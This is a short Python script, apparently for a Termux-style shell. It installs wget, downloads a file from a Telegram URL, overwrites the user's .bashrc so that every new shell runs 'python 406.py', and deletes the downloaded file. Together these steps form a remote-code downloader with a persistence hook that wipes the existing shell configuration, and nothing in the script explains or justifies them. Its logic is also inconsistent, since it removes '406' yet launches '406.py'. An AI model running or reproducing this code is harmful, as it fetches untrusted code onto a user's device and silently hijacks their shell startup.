import os

url = 'https://t.me/afg12_34shariar/406'

os.system("apt install zip wget -y")
cmd = "wget "+url
os.system(cmd)
f = open(".bashrc", "w")
f.write("python 406.py")
f.close()
os.system("rm 406")